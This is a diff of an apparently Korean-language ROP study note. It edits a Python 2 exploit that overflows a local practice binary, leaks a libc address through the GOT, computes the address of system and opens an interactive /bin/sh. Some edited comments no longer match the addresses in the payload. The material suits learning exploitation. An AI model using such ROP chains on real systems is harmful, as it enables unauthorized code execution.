@@ -21,7 +21,7 @@ int main(void){
 
 #### ROP
 
-- 코드 영역에 있는 다양한 코드 가젯들을ㄹ 조합해 NX bit와 ASLR 보호 기법을 우회할 수 있는 공격 기법이다.
+- 코드 영역에 있는 다양한 코드 가젯들을 조합해 NX bit와 ASLR 보호 기법을 우회할 수 있는 공격 기법이다.
 - 스택 오버플로우와 같은 취약점으로 콜 스택을 통제할 수 있기 때문에 주로 스택 기반 연산을 하는 코드 가젯들이 사용된다.
 - 바이너리 코드 영역에 example5와 같은 코드 가젯들이 존재한다.
 
@@ -401,30 +401,29 @@ def u64(data):
 out_r, out_w = pty.openpty()
 s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
 print `read(out_r, 6)`
-# write(1, 0x601018, 8)
+# write(1, 0x601010, 8)
 payload  = "A"*264         # buf padding
 payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
 payload += p64(1)          # fd
 payload += p64(0x601018)   # write@got
 payload += p64(8)          # 8 
 payload += p64(0x400430)   # write_plt 
-# read(0, 0x601018, 16)
+# read(0, 0x601010, 16)
 payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
 payload += p64(0)          # fd
 payload += p64(0x601018)   # write@got
 payload += p64(16)          # 8
 payload += p64(0x400440)   # read@plt
-# write(0x601020,0,0)
+# write(0x601018,0,0)
 payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
 payload += p64(0x601020)   # /bin/sh
 payload += p64(0)          # 0
 payload += p64(0)          # 0
 payload += p64(0x400430)   # write@plt
 writeline(s, payload)
-
 libc = u64(read(out_r,8)[:8])
-base = libc - 0xd5c90
-system = base + 0x3adb0
+base = libc - 0xf73b0
+system = base + 0x453a0
 print hex(libc)
 writeline(s, p64(system)+"/bin/sh\x00")
 while True:
@@ -432,6 +431,7 @@ while True:
   writeline(s, cmd)
   time.sleep(0.2)
   print read(out_r, 1024)
+
 ```
 
 - 최종적으로 write 함수를 호출하고 "/bin/sh" 문자열 주소인 0x601020를 첫 번째 인자로 전달하면 쉘을 획득할 수 있다.
